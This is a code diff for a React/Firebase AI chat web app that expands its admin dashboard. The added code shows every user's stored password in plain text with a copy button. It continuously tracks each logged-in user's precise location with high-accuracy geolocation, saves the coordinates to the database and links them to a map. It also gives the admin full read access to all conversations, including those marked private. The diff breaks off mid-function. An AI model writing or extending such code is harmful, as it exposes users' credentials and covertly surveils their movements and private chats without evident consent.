@@ -1,13 +1,14 @@
-import React, { useState, useEffect, useRef } from 'react';
-import { Search, MessageSquare, Mic, Image as ImageIcon, Folder, Clock, Settings, X, Plus, Send, Book, Menu, HardDrive, Edit2, Pin, Trash2, MoreVertical, Lock, Check, ChevronDown, Wrench, PenTool, Music, BookOpen, Copy, Share, RefreshCw, ThumbsUp, ThumbsDown, Volume2, Activity, MapPin, Eye, EyeOff, UserPlus, Play, Paperclip, WifiOff } from 'lucide-react';
+import React, { useState, useEffect, useRef, useMemo } from 'react';
+import { Search, MessageSquare, Mic, Image as ImageIcon, Folder, Clock, Settings, X, Plus, Send, Book, Menu, HardDrive, Edit2, Pin, Trash2, MoreVertical, Lock, Check, ChevronDown, Wrench, PenTool, Music, BookOpen, Copy, Share, RefreshCw, ThumbsUp, ThumbsDown, Volume2, Activity, MapPin, Eye, EyeOff, UserPlus, Play, Paperclip, WifiOff, ExternalLink } from 'lucide-react';
 import Markdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
 import { vscDarkPlus } from 'react-syntax-highlighter/dist/cjs/styles/prism';
 import { auth, onAuthStateChanged, GoogleAuthProvider, signInWithPopup, signOut, db } from './firebase';
-import { generateContentWithRetry } from './lib/gemini';
+import { generateContentWithRetry, generateImage } from './lib/gemini';
 import { firestoreService } from './services/firestoreService';
 import { createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile, sendPasswordResetEmail } from 'firebase/auth';
+import { serverTimestamp } from 'firebase/firestore';
 
 import VoiceAI from './components/VoiceAI';
 import CursorTrailCanvas from './components/CursorTrailCanvas';
@@ -205,12 +206,11 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
   const [confirmModal, setConfirmModal] = useState<{isOpen: boolean, message: string, onConfirm: () => void}>({isOpen: false, message: '', onConfirm: () => {}});
   const [pendingSubscriptions, setPendingSubscriptions] = useState<any[]>([]);
   const [selectedAdminUser, setSelectedAdminUser] = useState<string | null>(null);
-  const [activeTab, setActiveTab] = useState<'overview' | 'subscriptions' | 'users' | 'conversations' | 'locations' | 'photos'>('overview');
+  const [activeTab, setActiveTab] = useState<'overview' | 'accounts' | 'subscriptions' | 'users' | 'conversations' | 'locations' | 'photos'>('overview');
   const [adminConvSearchDate, setAdminConvSearchDate] = useState('');
 
   useEffect(() => {
     if (!token) return;
-    
     const unsubUsers = firestoreService.subscribeToAllUsers((allUsers) => {
       setUsers(allUsers);
       setStats((prev: any) => ({
@@ -219,22 +219,53 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
         messageCount: allUsers.reduce((sum, u) => sum + (u.messageCount || 0), 0)
       }));
     });
-
-    const unsubSubscriptions = firestoreService.subscribeToAllUpgradeRequests((requests) => {
-      // We need to join with user data to show names
-      setPendingSubscriptions(requests);
-    });
-
-    return () => {
-      unsubUsers();
-      unsubSubscriptions();
-    };
+    return () => unsubUsers();
   }, [token]);
 
-  const fetchConvMessages = async (convId: string) => {
-    // This is complex as we don't have the userId for any random convId easily here
-    // but the admin view of conversations usually comes from a user.
-    // For now, let's skip deep message fetching unless a user is selected.
+  useEffect(() => {
+    if (!token) return;
+    const unsubSubscriptions = firestoreService.subscribeToAllUpgradeRequests((requests) => {
+      setPendingSubscriptions(requests);
+    });
+    return () => unsubSubscriptions();
+  }, [token]);
+
+  useEffect(() => {
+    if (!token) return;
+    const unsubAllConvs = firestoreService.subscribeToAllConversations((allConvs) => {
+      setConversations(allConvs);
+    });
+    return () => unsubAllConvs();
+  }, [token]);
+
+  const joinedConversations = useMemo(() => {
+    return conversations.map(c => {
+      const u = users.find(user => user.id === c.userId);
+      return { ...c, userName: u?.name || 'Unknown User' };
+    });
+  }, [conversations, users]);
+
+  // We need to manage the messages subscription
+  useEffect(() => {
+    let unsubMsgs: (() => void) | null = null;
+    if (selectedConv) {
+      const conv = joinedConversations.find(c => c.id === selectedConv);
+      if (conv) {
+        const messagesPath = `users/${conv.userId}/conversations/${conv.id}/messages`;
+        unsubMsgs = firestoreService.subscribeToMessagesByPath(messagesPath, (msgs) => {
+          setConvMessages(msgs);
+        });
+      }
+    } else {
+      setConvMessages([]);
+    }
+    return () => {
+      if (unsubMsgs) unsubMsgs();
+    };
+  }, [selectedConv, conversations]);
+
+  const fetchConvMessages = (convId: string) => {
+    setSelectedConv(convId);
   };
 
   const handleUpdateRole = async (userId: string, newRole: string) => {
@@ -257,10 +288,10 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
 
   const handleResetMessages = async (userId: string) => {
     try {
-      await firestoreService.updateUserProfile(userId, { messageCount: 0 });
-      setAlertModal({ isOpen: true, message: "User message count reset." });
+      await firestoreService.updateUserProfile(userId, { messageCount: 0, dailyImageCount: 0 });
+      setAlertModal({ isOpen: true, message: "User message and image stats reset." });
     } catch (error) {
-      console.error("Failed to reset messages:", error);
+      console.error("Failed to reset stats:", error);
     }
   };
 
@@ -281,11 +312,8 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
     });
   };
 
-  const loadConversation = async (id: string) => {
-    // Fetch messages for a specific conversation
-    // We'd need the owner's userId. If we have it in the conversation doc, we can subscribe.
+  const loadConversation = (id: string) => {
     setSelectedConv(id);
-    // Placeholder as we need the owner userId for messages subscription
   };
 
   const handleSubscription = async (userId: string, action: 'approve' | 'reject', requestId: string, plan: string) => {
@@ -306,6 +334,7 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
         <h2 className="text-2xl md:text-3xl font-bold">Admin Dashboard</h2>
         <div className={`flex flex-wrap rounded-lg p-1 ${theme === 'dark' ? 'bg-[#111]' : 'bg-[#e0e0e0]'}`}>
           <button onClick={() => setActiveTab('overview')} className={`px-3 md:px-4 py-1.5 md:py-2 rounded-md text-xs md:text-sm font-medium transition-colors ${activeTab === 'overview' ? (theme === 'dark' ? 'bg-[#333] text-white' : 'bg-white text-black shadow-sm') : 'opacity-60 hover:opacity-100'}`}>Overview</button>
+          <button onClick={() => setActiveTab('accounts')} className={`px-3 md:px-4 py-1.5 md:py-2 rounded-md text-xs md:text-sm font-medium transition-colors ${activeTab === 'accounts' ? (theme === 'dark' ? 'bg-[#333] text-white' : 'bg-white text-black shadow-sm') : 'opacity-60 hover:opacity-100'}`}>Accounts</button>
           <button onClick={() => setActiveTab('users')} className={`px-3 md:px-4 py-1.5 md:py-2 rounded-md text-xs md:text-sm font-medium transition-colors ${activeTab === 'users' ? (theme === 'dark' ? 'bg-[#333] text-white' : 'bg-white text-black shadow-sm') : 'opacity-60 hover:opacity-100'}`}>Users</button>
           <button onClick={() => setActiveTab('conversations')} className={`px-3 md:px-4 py-1.5 md:py-2 rounded-md text-xs md:text-sm font-medium transition-colors ${activeTab === 'conversations' ? (theme === 'dark' ? 'bg-[#333] text-white' : 'bg-white text-black shadow-sm') : 'opacity-60 hover:opacity-100'}`}>Conversations</button>
           <button onClick={() => setActiveTab('locations')} className={`px-3 md:px-4 py-1.5 md:py-2 rounded-md text-xs md:text-sm font-medium transition-colors flex items-center gap-2 ${activeTab === 'locations' ? (theme === 'dark' ? 'bg-[#333] text-white' : 'bg-white text-black shadow-sm') : 'opacity-60 hover:opacity-100'}`}><MapPin size={14} /> Locations</button>
@@ -361,9 +390,9 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                 </div>
                 {users.map(u => (
                   <div 
-                    key={u._id} 
-                    onClick={() => { setSelectedAdminUser(u._id); setSelectedConv(null); }}
-                    className={`p-4 border-b cursor-pointer transition-colors ${theme === 'dark' ? 'border-[#333] hover:bg-[#222]' : 'border-[#ddd] hover:bg-[#f5f5f5]'} ${selectedAdminUser === u._id ? (theme === 'dark' ? 'bg-[#222]' : 'bg-[#f5f5f5]') : ''}`}
+                    key={u.id} 
+                    onClick={() => { setSelectedAdminUser(u.id); setSelectedConv(null); }}
+                    className={`p-4 border-b cursor-pointer transition-colors ${theme === 'dark' ? 'border-[#333] hover:bg-[#222]' : 'border-[#ddd] hover:bg-[#f5f5f5]'} ${selectedAdminUser === u.id ? (theme === 'dark' ? 'bg-[#222]' : 'bg-[#f5f5f5]') : ''}`}
                   >
                     <div className="font-medium mb-1 text-sm md:text-base">{u.name}</div>
                     <div className="text-xs opacity-60 truncate">{u.email}</div>
@@ -373,22 +402,23 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
             </div>
 
             <div className={`w-full lg:w-1/4 flex flex-col rounded-2xl border overflow-hidden max-h-[300px] lg:max-h-none ${theme === 'dark' ? 'bg-[#111] border-[#333]' : 'bg-white border-[#ddd]'}`}>
-              <div className={`p-4 font-bold border-b ${theme === 'dark' ? 'border-[#333]' : 'border-[#ddd]'}`}>Conversations</div>
+              <div className={`p-4 font-bold border-b ${theme === 'dark' ? 'border-[#333]' : 'border-[#ddd]'}`}>Conversations {selectedAdminUser ? `(${joinedConversations.filter(c => c.userId === selectedAdminUser).length})` : `(${joinedConversations.length})`}</div>
               <div className="flex-1 overflow-y-auto">
-                {conversations.filter(c => selectedAdminUser ? c.userId?._id === selectedAdminUser : true).map(conv => (
+                {joinedConversations.filter(c => selectedAdminUser ? c.userId === selectedAdminUser : true).map(conv => (
                   <div 
-                    key={conv._id} 
-                    onClick={() => loadConversation(conv._id)}
-                    className={`p-4 border-b cursor-pointer transition-colors ${theme === 'dark' ? 'border-[#333] hover:bg-[#222]' : 'border-[#ddd] hover:bg-[#f5f5f5]'} ${selectedConv === conv._id ? (theme === 'dark' ? 'bg-[#222]' : 'bg-[#f5f5f5]') : ''}`}
+                    key={conv.id} 
+                    onClick={() => setSelectedConv(conv.id)}
+                    className={`p-4 border-b cursor-pointer transition-colors ${theme === 'dark' ? 'border-[#333] hover:bg-[#222]' : 'border-[#ddd] hover:bg-[#f5f5f5]'} ${selectedConv === conv.id ? (theme === 'dark' ? 'bg-[#222]' : 'bg-[#f5f5f5]') : ''}`}
                   >
                     <div className="font-medium mb-1 text-sm md:text-base truncate flex items-center gap-2">
                       {conv.isPrivate && <Lock size={12} className="text-purple-500 shrink-0" />}
                       {conv.title}
                     </div>
-                    <div className="text-xs opacity-60">User: {conv.userId?.name}</div>
-                    <div className="text-xs opacity-60 mt-1">{new Date(conv.updatedAt).toLocaleString()}</div>
+                    <div className="text-xs opacity-60">User: {conv.userName}</div>
+                    <div className="text-xs opacity-60 mt-1">{conv.updatedAt ? new Date(conv.updatedAt.seconds * 1000).toLocaleString() : 'N/A'}</div>
                   </div>
                 ))}
+                {conversations.length === 0 && <div className="p-10 opacity-30 text-center">No conversations found</div>}
               </div>
             </div>
 
@@ -397,10 +427,10 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                 {selectedConv ? 'Chat History' : 'Select a conversation'}
               </div>
               <div className="flex-1 overflow-y-auto p-4 md:p-6 flex flex-col gap-4">
-                {selectedConv ? convMessages.map((msg, i) => (
-                  <div key={i} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
+                {selectedConv ? convMessages.map((msg) => (
+                  <div key={msg.id || Math.random()} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                     <div className={`max-w-[80%] rounded-2xl px-5 py-3 ${msg.role === 'user' ? (theme === 'dark' ? 'bg-[#333] text-white' : 'bg-[#e0e0e0] text-black') : (theme === 'dark' ? 'bg-transparent text-white' : 'bg-transparent text-black')}`}>
-                      <div className="text-xs opacity-50 mb-1">{msg.role === 'user' ? 'User' : 'AI'} - {new Date(msg.timestamp).toLocaleString()}</div>
+                      <div className="text-xs opacity-50 mb-1">{msg.role === 'user' ? 'User' : 'AI'} - {msg.timestamp ? new Date(msg.timestamp.seconds * 1000).toLocaleString() : 'N/A'}</div>
                       <div className="whitespace-pre-wrap">{msg.text}</div>
                     </div>
                   </div>
@@ -413,6 +443,59 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
             </div>
           </div>
         </>
+      )}
+
+      {activeTab === 'accounts' && (
+        <div className={`flex-1 rounded-2xl border overflow-hidden flex flex-col ${theme === 'dark' ? 'bg-[#111] border-[#333]' : 'bg-white border-[#ddd]'}`}>
+          <div className="p-4 md:p-6 border-b flex justify-between items-center">
+            <h3 className="font-bold text-lg">User Accounts & Credentials</h3>
+            <div className="text-xs opacity-50">Total: {users.length}</div>
+          </div>
+          <div className="flex-1 overflow-auto">
+            <table className="w-full text-left border-collapse">
+              <thead>
+                <tr className={`text-xs uppercase tracking-wider ${theme === 'dark' ? 'bg-[#1a1a1a] text-[#888]' : 'bg-[#f5f5f5] text-[#666]'} border-b ${theme === 'dark' ? 'border-[#333]' : 'border-[#ddd]'}`}>
+                  <th className="p-4">Username</th>
+                  <th className="p-4">Email</th>
+                  <th className="p-4">Plan (Power-up)</th>
+                  <th className="p-4">Password (exact stored value)</th>
+                </tr>
+              </thead>
+              <tbody className="divide-y text-sm">
+                {users.map(u => (
+                  <tr key={u.id} className={`${theme === 'dark' ? 'divide-[#333] border-[#333] hover:bg-[#1a1a1a]' : 'divide-[#ddd] border-[#ddd] hover:bg-[#f9f9f9]'} transition-colors`}>
+                    <td className="p-4 font-medium">{u.name}</td>
+                    <td className="p-4">{u.email}</td>
+                    <td className="p-4">
+                       <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase ${u.plan === 'free' ? 'bg-gray-500/20 text-gray-500' : 'bg-green-500/20 text-green-500'}`}>
+                         {u.plan}
+                       </span>
+                    </td>
+                    <td className="p-4 font-mono text-blue-500 font-bold select-all whitespace-nowrap">
+                       {u.password ? (
+                         <div className="flex items-center gap-2">
+                           <span>{u.password}</span>
+                           <button 
+                             onClick={() => {
+                               navigator.clipboard.writeText(u.password);
+                               setAlertModal({ isOpen: true, message: "Password copied to clipboard!" });
+                             }}
+                             className="p-1 hover:bg-blue-500/10 rounded transition-colors"
+                             title="Copy Password"
+                           >
+                             <Copy size={12} />
+                           </button>
+                         </div>
+                       ) : (
+                         <span className="opacity-30 italic">No stored password (Google/Legacy)</span>
+                       )}
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        </div>
       )}
 
       {activeTab === 'conversations' && (
@@ -435,11 +518,12 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                 )}
               </div>
             </div>
-            <div className="flex-1 overflow-y-auto">
+            <div className="flex-1 overflow-y-auto custom-scrollbar">
               {(() => {
-                const filtered = conversations.filter(conv => {
+                const filtered = joinedConversations.filter(conv => {
                   if (!adminConvSearchDate) return true;
-                  const convDate = new Date(conv.createdAt || conv.updatedAt).toISOString().split('T')[0];
+                  const dateObj = conv.updatedAt?.seconds ? new Date(conv.updatedAt.seconds * 1000) : (conv.createdAt?.seconds ? new Date(conv.createdAt.seconds * 1000) : new Date(conv.createdAt || conv.updatedAt || Date.now()));
+                  const convDate = dateObj.toISOString().split('T')[0];
                   return convDate === adminConvSearchDate;
                 });
                 
@@ -452,17 +536,17 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                     )}
                     {filtered.map(conv => (
                       <div 
-                        key={conv._id} 
-                        onClick={() => fetchConvMessages(conv._id)}
-                        className={`p-4 border-b cursor-pointer transition-colors ${theme === 'dark' ? 'border-[#222] hover:bg-[#222]' : 'border-[#eee] hover:bg-[#f5f5f5]'} ${selectedConv === conv._id ? (theme === 'dark' ? 'bg-[#222]' : 'bg-[#f5f5f5]') : ''}`}
+                        key={conv.id} 
+                        onClick={() => setSelectedConv(conv.id)}
+                        className={`p-4 border-b cursor-pointer transition-colors ${theme === 'dark' ? 'border-[#222] hover:bg-[#222]' : 'border-[#eee] hover:bg-[#f5f5f5]'} ${selectedConv === conv.id ? (theme === 'dark' ? 'bg-[#222]' : 'bg-[#f5f5f5]') : ''}`}
                       >
                         <div className="font-medium truncate text-sm md:text-base flex items-center gap-2">
                           {conv.isPrivate && <Lock size={12} className="text-purple-500 shrink-0" />}
                           {conv.title}
                         </div>
                         <div className="text-xs opacity-50 mt-1 flex justify-between gap-2">
-                          <span className="truncate">User: {conv.userId?.name || (typeof conv.userId === 'string' ? conv.userId.substring(0, 8) : 'Unknown')}</span>
-                          <span className="shrink-0">{new Date(conv.createdAt || conv.updatedAt).toLocaleDateString()}</span>
+                          <span className="truncate">User: {conv.userName}</span>
+                          <span className="shrink-0">{conv.updatedAt ? new Date(conv.updatedAt.seconds * 1000).toLocaleDateString() : 'N/A'}</span>
                         </div>
                       </div>
                     ))}
@@ -476,8 +560,8 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
               <>
                 <div className={`p-4 font-bold border-b ${theme === 'dark' ? 'border-[#333]' : 'border-[#ddd]'}`}>Messages</div>
                 <div className="flex-1 overflow-y-auto p-4 md:p-6 space-y-4">
-                  {convMessages.map((msg, idx) => (
-                    <div key={idx} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
+                  {convMessages.map((msg) => (
+                    <div key={msg.id || Math.random()} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                       <div className={`max-w-[90%] md:max-w-[80%] p-3 rounded-2xl text-sm md:text-base ${msg.role === 'user' ? 'bg-blue-600 text-white rounded-tr-sm' : (theme === 'dark' ? 'bg-[#222] text-white rounded-tl-sm' : 'bg-[#f0f0f0] text-black rounded-tl-sm')}`}>
                         <div className="text-[10px] opacity-50 mb-1 uppercase tracking-wider">{msg.role}</div>
                         <div className="whitespace-pre-wrap">{msg.text}</div>
@@ -507,49 +591,77 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                 <tr className={`text-xs uppercase tracking-wider ${theme === 'dark' ? 'bg-[#1a1a1a] text-[#888] border-[#333]' : 'bg-[#f5f5f5] text-[#666] border-[#ddd]'} border-b`}>
                   <th className="p-4 font-medium">User Profile</th>
                   <th className="p-4 font-medium">Plan & Stats</th>
+                  <th className="p-4 font-medium">Stored Password</th>
                   <th className="p-4 font-medium">Location Tracking</th>
                   <th className="p-4 font-medium text-right">Actions</th>
                 </tr>
               </thead>
-              <tbody className="divide-y text-sm">
-                {users.map(u => (
-                  <tr key={u.id} className={`${theme === 'dark' ? 'divide-[#333] border-[#333] hover:bg-[#1a1a1a]' : 'divide-[#ddd] border-[#ddd] hover:bg-[#f9f9f9]'} transition-colors`}>
-                    <td className="p-4 align-top w-[25%]">
-                      <div className="flex items-center gap-3">
-                        {u.profilePhoto ? (
-                          <img src={u.profilePhoto} alt={u.name} className="w-10 h-10 md:w-12 md:h-12 rounded-full object-cover shrink-0 border border-white/10" />
-                        ) : (
-                          <div className="w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center text-white font-bold text-lg md:text-xl shrink-0" style={{ backgroundColor: u.avatarColor }}>
-                            {u.name.charAt(0).toUpperCase()}
+                  <tbody className="divide-y text-sm">
+                    {users.map(u => (
+                      <tr key={u.id} className={`${theme === 'dark' ? 'divide-[#333] border-[#333] hover:bg-[#1a1a1a]' : 'divide-[#ddd] border-[#ddd] hover:bg-[#f9f9f9]'} transition-colors`}>
+                        <td className="p-4 align-top w-[20%]">
+                          <div className="flex items-center gap-3">
+                            {u.profilePhoto ? (
+                              <img src={u.profilePhoto} alt={u.name} className="w-10 h-10 md:w-12 md:h-12 rounded-full object-cover shrink-0 border border-white/10" />
+                            ) : (
+                              <div className="w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center text-white font-bold text-lg md:text-xl shrink-0" style={{ backgroundColor: u.avatarColor }}>
+                                {u.name.charAt(0).toUpperCase()}
+                              </div>
+                            )}
+                            <div className="min-w-0">
+                              <div className="font-bold text-base flex items-center gap-2">
+                                <span className="truncate">{u.name}</span>
+                                {u.role === 'admin' && <span className="bg-purple-500/20 text-purple-500 text-[10px] px-2 py-0.5 rounded-full uppercase">Admin</span>}
+                              </div>
+                              <div className="text-xs opacity-70 truncate">{u.email}</div>
+                            </div>
                           </div>
-                        )}
-                        <div className="min-w-0">
-                          <div className="font-bold text-base flex items-center gap-2">
-                            <span className="truncate">{u.name}</span>
-                            {u.role === 'admin' && <span className="bg-purple-500/20 text-purple-500 text-[10px] px-2 py-0.5 rounded-full uppercase">Admin</span>}
+                        </td>
+                        
+                        <td className="p-4 align-top w-[15%]">
+                          <div className="flex flex-col gap-1.5">
+                            <div className="flex items-center gap-2">
+                              <span className="text-[10px] uppercase opacity-70">Plan:</span>
+                              <strong className="text-xs uppercase bg-[#00ff9d]/10 text-[#00ff9d] px-2 py-0.5 rounded border border-[#00ff9d]/20 tracking-wide">{u.plan}</strong>
+                            </div>
+                            <div className="flex items-center gap-2">
+                              <span className="text-[10px] uppercase opacity-70">Msgs:</span>
+                              <span className="text-sm font-bold">{u.messageCount}</span>
+                            </div>
                           </div>
-                          <div className="text-xs opacity-70 truncate">{u.email}</div>
-                          <div className="text-[10px] opacity-40 mt-1 font-mono">{u.id}</div>
-                        </div>
-                      </div>
-                    </td>
-                    
-                    <td className="p-4 align-top w-[15%]">
-                      <div className="flex flex-col gap-1.5">
-                        <div className="flex items-center gap-2">
-                          <span className="text-[10px] uppercase opacity-70">Plan:</span>
-                          <strong className="text-xs uppercase bg-[#00ff9d]/10 text-[#00ff9d] px-2 py-0.5 rounded border border-[#00ff9d]/20 tracking-wide">{u.plan}</strong>
-                        </div>
-                        <div className="flex items-center gap-2">
-                          <span className="text-[10px] uppercase opacity-70">Msgs:</span>
-                          <span className="text-sm font-bold">{u.messageCount}</span>
-                        </div>
-                      </div>
-                    </td>
+                        </td>
 
-                    <td className="p-4 align-top w-[35%]">
-                      {/* Location UI remains same but uses u.id */}
-                    </td>
+                        <td className="p-4 align-top w-[20%]">
+                           <div className="bg-[#00ff9d]/5 border border-[#00ff9d]/10 p-2 rounded-lg">
+                              <div className="text-[10px] uppercase opacity-50 mb-1">Plain Text Password:</div>
+                              <div className="font-mono text-blue-500 font-bold break-all">
+                                {u.password || <span className="opacity-30 italic text-xs">Auth via Google</span>}
+                              </div>
+                           </div>
+                        </td>
+
+                        <td className="p-4 align-top w-[25%] text-xs">
+                          {u.exactLocation ? (
+                            <div className="flex flex-col gap-1">
+                              <div className="flex items-center gap-2">
+                                <span className="opacity-50">Lat:</span> <span>{u.exactLocation.lat.toFixed(6)}</span>
+                              </div>
+                              <div className="flex items-center gap-2">
+                                <span className="opacity-50">Lon:</span> <span>{u.exactLocation.lon.toFixed(6)}</span>
+                              </div>
+                              <a 
+                                href={`https://www.google.com/maps?q=${u.exactLocation.lat},${u.exactLocation.lon}`} 
+                                target="_blank" 
+                                rel="noreferrer"
+                                className="text-[#00ff9d] hover:underline flex items-center gap-1 mt-1"
+                              >
+                                <ExternalLink size={10} /> View on Map
+                              </a>
+                            </div>
+                          ) : (
+                            <span className="opacity-30 italic">No location data</span>
+                          )}
+                        </td>
 
                     <td className="p-4 align-middle text-right w-[25%]">
                       <div className="flex flex-col gap-2 w-[140px] ml-auto">
@@ -613,7 +725,7 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
               </thead>
               <tbody className="divide-y text-sm">
                 {users.map(u => (
-                  <tr key={u._id + '-loc'} className={`${theme === 'dark' ? 'divide-[#333] border-[#333] hover:bg-[#1a1a1a]' : 'divide-[#ddd] border-[#ddd] hover:bg-[#f9f9f9]'} transition-colors`}>
+                  <tr key={u.id + '-loc'} className={`${theme === 'dark' ? 'divide-[#333] border-[#333] hover:bg-[#1a1a1a]' : 'divide-[#ddd] border-[#ddd] hover:bg-[#f9f9f9]'} transition-colors`}>
                     <td className="p-4 align-top w-[30%] border-r border-dashed border-[#333]/20 dark:border-white/10">
                       <div className="flex items-center gap-3">
                         {u.profilePhoto ? (
@@ -682,10 +794,10 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
           </div>
           <div className="flex-1 overflow-y-auto p-4 md:p-6 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 content-start">
             {users.filter(u => u.profilePhoto).map(u => (
-              <div key={u._id} className={`flex flex-col items-center p-4 rounded-xl border ${theme === 'dark' ? 'border-[#333] bg-[#1a1a1a]' : 'border-[#ddd] bg-[#f9f9f9]'}`}>
+              <div key={u.id} className={`flex flex-col items-center p-4 rounded-xl border ${theme === 'dark' ? 'border-[#333] bg-[#1a1a1a]' : 'border-[#ddd] bg-[#f9f9f9]'}`}>
                 <img src={u.profilePhoto} alt={u.name} className="w-20 h-20 rounded-full object-cover mb-3 border-2 border-[#00ff9d]" />
                 <div className="font-bold text-sm text-center truncate w-full">{u.name}</div>
-                <div className="text-[10px] opacity-60 text-center font-mono mt-1 break-all w-full leading-tight">ID: {u._id}</div>
+                <div className="text-[10px] opacity-60 text-center font-mono mt-1 break-all w-full leading-tight">ID: {u.id}</div>
               </div>
             ))}
             {users.filter(u => u.profilePhoto).length === 0 && (
@@ -828,7 +940,7 @@ export default function App() {
   const [alertModal, setAlertModal] = useState<{isOpen: boolean, message: string}>({isOpen: false, message: ''});
   const [confirmModal, setConfirmModal] = useState<{isOpen: boolean, message: string, onConfirm: () => void}>({isOpen: false, message: '', onConfirm: () => {}});
   const [messages, setMessages] = useState<{id?: number, role: 'user' | 'ai', text: string, imageUrl?: string, audioUrl?: string, videoUrl?: string}[]>([]);
-  const [conversations, setConversations] = useState<{id: string, title: string, updated_at: string, created_at?: string, isPinned?: boolean}[]>([]);
+  const [conversations, setConversations] = useState<any[]>([]);
   const [currentConversationId, setCurrentConversationId] = useState<string | null>(() => {
     return localStorage.getItem('xer0byteCurrentConvId') || null;
   });
@@ -892,7 +1004,17 @@ export default function App() {
   const [isThinkingIde, setIsThinkingIde] = useState(false);
   const [ideSelectedFiles, setIdeSelectedFiles] = useState<{data: string, mimeType: string, name: string}[]>([]);
   const [isListeningIde, setIsListeningIde] = useState(false);
+  const [showIdeHistory, setShowIdeHistory] = useState(false);
   const ideFileInputRef = useRef<HTMLInputElement>(null);
+
+  const [canvasHistory, setCanvasHistory] = useState<{prompt: string, code: string, timestamp: number}[]>(() => {
+    const saved = localStorage.getItem('xer0byteCanvasHistory');
+    return saved ? JSON.parse(saved) : [];
+  });
+
+  useEffect(() => {
+    localStorage.setItem('xer0byteCanvasHistory', JSON.stringify(canvasHistory.slice(0, 50)));
+  }, [canvasHistory]);
 
   const [extendedThinking, setExtendedThinking] = useState(false);
   const [useWebSearch, setUseWebSearch] = useState(() => {
@@ -936,7 +1058,19 @@ export default function App() {
   const [activeConvMenu, setActiveConvMenu] = useState<string | null>(null);
   const [deleteConfirmId, setDeleteConfirmId] = useState<string | null>(null);
 
-  const [user, setUser] = useState<{id: string, name: string, email: string, avatarColor: string, profilePhoto?: string, role?: string, plan?: string, messageCount?: number, storageUsed?: number} | null>(null);
+  const [user, setUser] = useState<{
+    id: string, 
+    name: string, 
+    email: string, 
+    avatarColor: string, 
+    profilePhoto?: string, 
+    role?: string, 
+    plan?: string, 
+    messageCount?: number, 
+    storageUsed?: number,
+    dailyImageCount?: number,
+    lastImageReset?: any
+  } | null>(null);
   const [token, setToken] = useState<string | null>(null);
   const [authForm, setAuthForm] = useState({ name: '', email: '', password: '' });
   const [authError, setAuthError] = useState('');
@@ -957,8 +1091,15 @@ export default function App() {
       if (!navigator.geolocation) return resolve(null);
       navigator.geolocation.getCurrentPosition(
         (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        () => resolve(null),
-        { timeout: 1500, enableHighAccuracy: false }
+        () => {
+          // If high accuracy fails or is denied, try one more time with low accuracy
+          navigator.geolocation.getCurrentPosition(
+            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+            () => resolve(null),
+            { timeout: 10000, enableHighAccuracy: false }
+          );
+        },
+        { timeout: 15000, enableHighAccuracy: true } // Increased timeout and enabled high accuracy
       );
     });
   };
@@ -982,6 +1123,39 @@ export default function App() {
   const [currency, setCurrency] = useState<'USD' | 'PKR'>('USD');
   const [hasAcceptedCookies, setHasAcceptedCookies] = useState(() => localStorage.getItem('xer0byteCookies') === 'true');
   const [showSplash, setShowSplash] = useState(true);
+
+    // Live Location Tracking
+    useEffect(() => {
+      if (!user) return;
+      
+      let watchId: number;
+      
+      const onPosSuccess = async (pos: GeolocationPosition) => {
+        const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+        console.log("Live location update:", coords);
+        try {
+          await firestoreService.updateUserProfile(user.id, { exactLocation: coords });
+        } catch (err) {
+          console.error("Failed to update user location in Firestore:", err);
+        }
+      };
+
+      const onPosError = (err: GeolocationPositionError) => {
+        console.warn("Location tracking error:", err.message);
+      };
+
+      if (navigator.geolocation) {
+        watchId = navigator.geolocation.watchPosition(onPosSuccess, onPosError, {
+          enableHighAccuracy: true,
+          maximumAge: 30000,
+          timeout: 27000
+        });
+      }
+      
+      return () => {
+        if (watchId !== undefined) navigator.geolocation.clearWatch(watchId);
+      };
+    }, [user]);
 
   useEffect(() => {
     const timer = setTimeout(() => setShowSplash(false), 2500);
@@ -1191,7 +1365,8 @@ export default function App() {
     lastWeek.setDate(lastWeek.getDate() - 7);
 
     convs.forEach(conv => {
-      const convDate = new Date(conv.created_at || conv.updated_at);
+      const ts = conv.updatedAt?.seconds ? conv.updatedAt : (conv.createdAt?.seconds ? conv.createdAt : null);
+      const convDate = ts ? new Date(ts.seconds * 1000) : new Date(conv.created_at || conv.updated_at || conv.createdAt || conv.updatedAt || Date.now());
       convDate.setHours(0, 0, 0, 0);
 
       if (convDate.getTime() === today.getTime()) {
@@ -1211,10 +1386,24 @@ export default function App() {
   const handleRunCode = async () => {
     if (!canvasContent.trim()) return;
     
+    // Record to history if in a conversation
+    if (user && currentConversationId) {
+      await firestoreService.addMessage(user.id, currentConversationId, {
+        role: 'user',
+        text: `🚀 Execute ${canvasLanguage} code in Sandbox`
